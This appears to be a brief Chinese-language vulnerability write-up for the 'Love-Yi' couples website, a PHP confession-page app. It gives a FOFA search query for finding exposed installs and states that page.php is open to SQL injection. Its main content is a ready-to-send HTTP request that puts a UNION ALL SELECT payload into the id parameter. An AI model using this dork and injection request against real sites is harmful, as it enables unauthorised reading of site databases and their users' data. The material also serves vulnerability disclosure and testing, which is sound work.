**fofa**

body="Style/toastr/toastr.js"

**一、漏洞简述**

Love-Yi情侣网站是使用php语言开发，基于爱情主题的表白网站。个人也可进行DIY设计进行美观，适合哄女朋友开心。其接口page.php存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

**二、漏洞检测poc**

```yaml
GET /page.php?id=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cmd5(123456)%2CNULL%2CNULL--%20- HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Connection: close


```

